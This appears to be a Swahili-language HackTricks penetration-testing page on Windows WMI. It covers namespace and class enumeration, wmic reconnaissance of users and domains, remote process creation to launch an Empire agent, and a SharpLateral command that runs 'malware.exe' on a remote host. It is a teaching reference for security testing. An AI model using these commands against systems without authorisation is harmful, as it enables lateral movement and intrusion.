# WmicExec

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Jinsi Inavyofanya Kazi Iliyoelezwa

Mchakato unaweza kufunguliwa kwenye mwenyeji ambapo jina la mtumiaji na nywila au hash inajulikana kupitia matumizi ya WMI. Amri zinatekelezwa kwa kutumia WMI na Wmiexec, ikitoa uzoefu wa kikao cha sehemu.

**dcomexec.py:** Kwa kutumia vituo tofauti vya DCOM, hati hii inatoa kikao cha sehemu kama wmiexec.py, ikitegemea hasa kifaa cha DCOM cha ShellBrowserWindow. Kwa sasa inasaidia MMC20. Maombi, Dirisha la Shell, na Vitu vya Kivinjari cha Shell. (chanzo: [Makala za Kuhack](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## Misingi ya WMI

### Nafasi

Iliyopangwa kwa muundo wa saraka, chombo cha juu cha WMI ni \root, ambapo saraka zaidi, zinazojulikana kama nafasi, zimepangwa.
Amri za kuorodhesha nafasi:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Madarasa ndani ya jina la nafasi yanaweza kuorodheshwa kwa kutumia:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Darasa**

Kujua jina la darasa la WMI, kama vile win32\_process, na eneo la kuhifadhi linahitajika kwa operesheni yoyote ya WMI.
Amri za kuorodhesha darasa zinazoanza na `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Kuita darasa:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Njia

Njia, ambazo ni kazi moja au zaidi zinazoweza kutekelezwa za darasa la WMI, zinaweza kutekelezwa.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Uchunguzi wa WMI

### Hali ya Huduma ya WMI

Amri za kuthibitisha ikiwa huduma ya WMI inafanya kazi:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Taarifa za Mfumo na Mchakato

Kukusanya taarifa za mfumo na mchakato kupitia WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Kwa wadukuzi, WMI ni chombo kikali cha kuchunguza data nyeti kuhusu mifumo au maeneo.
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
### **Utafutaji wa Mbali wa WMI kwa Mikono**

Ugunduzi wa siri wa waendeshaji wa ndani kwenye kifaa cha mbali na watumiaji walioingia inawezekana kupitia utafutaji maalum wa WMI. `wmic` pia inasaidia kusoma kutoka kwenye faili ya maandishi ili kutekeleza amri kwenye vifaa vingi kwa wakati mmoja.

Kutekeleza mchakato kwa mbali kupitia WMI, kama vile kupeleka wakala wa Empire, amri ifuatayo hutumiwa, na utekelezaji mafanikio unaonyeshwa na thamani ya kurudi "0":
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Mchakato huu unaonyesha uwezo wa WMI kwa utekelezaji wa mbali na uchambuzi wa mfumo, ukionyesha umuhimu wake kwa utawala wa mfumo na upimaji wa uingiliaji.

## Marejeo
* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

## Zana za Kiotomatiki

* [**SharpLateral**](https://github.com/mertdas/SharpLateral):

{% code overflow="wrap" %}
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
{% endcode %}

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
